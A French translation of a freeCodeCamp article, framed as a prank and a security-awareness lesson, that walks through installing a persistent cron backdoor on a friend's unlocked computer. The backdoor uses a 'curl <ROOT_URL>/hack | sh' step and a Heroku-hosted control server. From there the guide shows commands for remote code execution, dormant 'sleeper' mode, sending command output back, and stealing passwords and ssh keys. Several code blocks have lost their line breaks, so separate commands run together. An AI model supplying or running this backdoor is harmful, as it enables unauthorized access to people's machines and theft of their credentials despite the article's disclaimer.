---
title: Comment pirater vos amis
subtitle: ''
author: freeCodeCamp
co_authors: []
series: null
date: '2016-07-27T18:46:15.000Z'
originalURL: https://freecodecamp.org/news/how-to-hack-your-friends-eef055389344
coverImage: https://cdn-media-1.freecodecamp.org/images/1*CRdFzUjOuDE-qB0ASTk9yQ.jpeg
tags:
- name: humor
  slug: humor
- name: General Programming
  slug: programming
- name: Security
  slug: security
- name: 'tech '
  slug: tech
- name: technology
  slug: technology
seo_title: Comment pirater vos amis
seo_desc: 'By Chet Corcos

  My friends often leave their computers open and unlocked. I tell them they should
  probably get in the habit of locking their computers, but they don’t listen to me.
  So I’ve created a simple project to hack my friends and show them the ...'
---

Par Chet Corcos

Mes amis laissent souvent leurs ordinateurs ouverts et déverrouillés. Je leur dis qu'ils devraient probablement prendre l'habitude de verrouiller leurs ordinateurs, mais ils ne m'écoutent pas. J'ai donc créé un projet simple pour pirater mes amis et leur montrer l'importance de la sécurité informatique.

Tout ce que je dois faire, c'est attendre qu'ils laissent leur ordinateur déverrouillé pendant quelques secondes, ouvrir leur terminal et taper une seule commande courte.

![Image](https://cdn-media-1.freecodecamp.org/images/m6THEYS8NfQbc3nmrt1d9xWavmQ0t5UqR7L0)

C'est tout ! Leur ordinateur est maintenant infecté et je peux exécuter n'importe quelle commande sur cet ordinateur à distance. Plutôt cool, non ? Ou peut-être choquant ?

Le piratage est illégal. Plus précisément :

> « accéder intentionnellement à un ordinateur sans autorisation ou dépasser l'accès autorisé » — Computer Fraud and Abuse Act (18 U.S.C. 1030)

Gardez donc à l'esprit que le but de cet article est de vous montrer à quel point il serait facile pour quelqu'un avec de mauvaises intentions de vous pirater, afin que vous puissiez éviter de vous faire pirater vous-même.

Il ne faut pas être un génie du piratage pour ruiner votre vie — n'importe quel « script kiddy » qui peut obtenir un accès physique à votre ordinateur peut vous compromettre en téléchargeant un script contenant seulement 50 lignes de code.

### Installation

Tout le code de ce projet se trouve dans [ce dépôt](https://github.com/ccorcos/hack/) si vous voulez plonger directement, mais je vais expliquer comment tout cela fonctionne ci-dessous.

Tout d'abord, vous devez simplement cloner le dépôt, installer ses dépendances et créer un lien symbolique pour l'outil de ligne de commande (CLI) _hack_.

```
git clone https://github.com/ccorcos/hack.gitgit remote remove origincd hacknpm installnpm link
```

Ensuite, vous devez configurer Heroku pour héberger les scripts qui s'exécuteront sur la machine de vos amis. Si vous n'avez jamais utilisé Heroku auparavant, [inscrivez-vous ici](https://signup.heroku.com/) (c'est gratuit !) et installez leur outil CLI sur votre machine.

```
brew install heroku-toolbeltheroku login
```

Maintenant, à l'intérieur du dépôt _hack_, créez une application Heroku avec un nom facile à retenir. J'utilise _hacker-chet_.

```
heroku create hacker-chet
```

Ensuite, vous devez exécuter une commande pour faire un peu de configuration. Tout ce qu'elle fait vraiment, c'est obtenir l'URL racine de votre site Heroku et la mettre dans votre _package.json_. De cette façon, le serveur peut injecter l'URL de l'application dans les scripts shell.

```
npm run init
```

Vous pouvez démarrer le serveur localement si vous voulez vous pirater vous-même et tester les choses.

```
npm start
```

Ou vous pouvez déployer sur Heroku.

```
npm run deploy
```

Maintenant, vous êtes prêt à pirater !

### API de Piratage

La beauté de ce programme est que pour commencer à pirater quelqu'un, vous devez simplement exécuter une seule commande sur sa machine.

```
curl <ROOT_URL>/hack | sh
```

_ROOT_URL_ est le chemin spécifique vers votre application. Lorsque vous exécutez le serveur localement, ce sera _localhost:5000_ et lorsque vous déployez sur Heroku, ce sera quelque chose comme _<APP_NAME>.herokuapp.com_.

Ce que cela fait, c'est configurer un cron job — un « travail chronologique » qui réexécute des tâches à certains moments — pour ping l'endpoint _/env/live_ toutes les minutes et envoie le résultat à _sh_. C'est en fait assez simple ! Et Heroku vous donne HTTPS gratuitement, donc c'est « sécurisé », non ?

Une fois que vous avez piraté votre ami, vous pouvez faire tout le reste avec l'outil de ligne de commande depuis votre ordinateur.

L'outil _hack_ a un concept d'environnements piratés différents. Lorsque vous piratez quelqu'un en utilisant l'endpoint _/hack_, cette personne commence dans l'environnement _live_. Et pour chaque environnement, vous pouvez exécuter une variété de commandes différentes. Je vais démontrer tout cela avec une petite visite guidée.

Ce qui suit réécrira le script shell de l'environnement _live_ pour exécuter la commande suivante qui dira à voix haute « Je te surveille. »

```
hack live exec "say 'I\'m watching you'"
```

Eh bien, cela ne va pas encore fonctionner, vous devez encore redéployer sur votre application Heroku.

```
hack deploy
```

![Image](https://cdn-media-1.freecodecamp.org/images/lZCEVaEwYojBREkv0FYXOep2WSuzeUFsc7No)

Maintenant, attendez la minute suivante et regardez l'ordinateur de votre ami ping votre serveur en suivant les logs du serveur.

```
hack logs
```

![Image](https://cdn-media-1.freecodecamp.org/images/c9QH5cbuC67pKigu-Tb2k18Yxhlibrhj2usu)

Le but des environnements est de pouvoir pirater plusieurs personnes en même temps. Pour isoler les personnes dans différents environnements, vous devez simplement changer le nom.

```
hack live rename jon
```

La prochaine fois que l'environnement live est pingé, il réécrira le cron job pour commencer à ping l'environnement _jon_ à la place.

![Image](https://cdn-media-1.freecodecamp.org/images/ocaA9PDrheoOnZd3tgUSjMyuNHGsSFMBBdWn)

Vous pouvez faire tout de même simplement en changeant l'argument de l'environnement.

```
hack jon exec "say 'hello jon'"
```

Maintenant, si vous avez eu assez de plaisir pour la journée et que la fête est terminée, vous pouvez « oublier » Jon et lui assurer que vous l'avez « dépiraté ».

```
hack jon forget
```

Cela effacera le cron job de leur ordinateur. Ou vous pourriez vouloir simplement mettre cet environnement en mode cellule dormante pour pouvoir le récupérer plus tard.

```
hack jon interval 1d
```

Maintenant, plutôt que de ping votre serveur toutes les minutes (par défaut), il pingera tous les jours à minuit. Et lorsque vous voulez le réveiller, vous pouvez changer l'intervalle pour qu'il soit toutes les minutes et le lendemain, vous êtes prêt à partir !

```
hack jon interval 1m
```

D'autres choses amusantes à faire sont de configurer des cron jobs supplémentaires. Voici comment vous pouvez réveiller votre ami à 6h du matin tous les jours pour lui rappeler la sécurité informatique.

```
hack jon cron "0 6 * * * say 'good morning jon, remember what I told you about locking your computer?'"
```

P.S. Si vous ne vous souvenez pas comment fonctionnent les cron jobs, [voici une excellente ressource](http://www.nncron.ru/help/EN/working/cron-format.htm). Tout se résume à ce petit diagramme.

```
* * * * *| | | | || | | | || | | | +---- Jour de la Semaine   (plage : 1-7, 1 représentant Lundi)| | | +------ Mois de l'Année    (plage : 1-12)| | +-------- Jour du Mois     (plage : 1-31)| +---------- Heure           (plage : 0-23)+------------ Minute         (plage : 0-59)
```

L'un de mes préférés est le préréglage _desktop_ qui téléchargera une image depuis une URL donnée et la définira comme photo de fond.

```
hack jon preset desktop http://i.imgur.com/5FC2r9R.jpg
```

Et si vous avez écrit un tas de cron jobs et que vous ne savez plus ce qu'il y a dessus, vous pouvez utiliser la commande dump.

```
hack jon dump "crontab -l"
```

Maintenant, ouvrez vos logs et vous verrez la sortie au prochain ping. Cela devient en fait beaucoup plus sinistre maintenant que vous pouvez obtenir des informations en retour. Si vous vouliez être plus néfaste, vous pourriez rechercher des mots de passe déchiffrés ou voler leurs clés ssh.

```
hack jon preset passwordshack jon preset ssh
```

Mais si vous voulez simplement lui donner une bonne vieille peur, envoyez-lui un message de rançon !

```
hack jon preset ransom "Hello Jon, I told you not to leave your computer unlocked."
```

![Image](https://cdn-media-1.freecodecamp.org/images/4XvzBEX8686IJ-ZNhlNjyrVIDIGKEY-SOhtK)

Enfin, si vous vous retrouvez à ajouter un tas de cron jobs et que vous voulez simplement recommencer, reset est là pour vous aider.

```
hack jon reset
```

Maintenant, amusez-vous (de manière responsable) avec cette chose et faites-moi savoir quelles sont vos farces préférées en [soumettant une pull request](https://github.com/ccorcos/hack) avec une nouvelle commande ou un nouveau préréglage !

Bon piratage !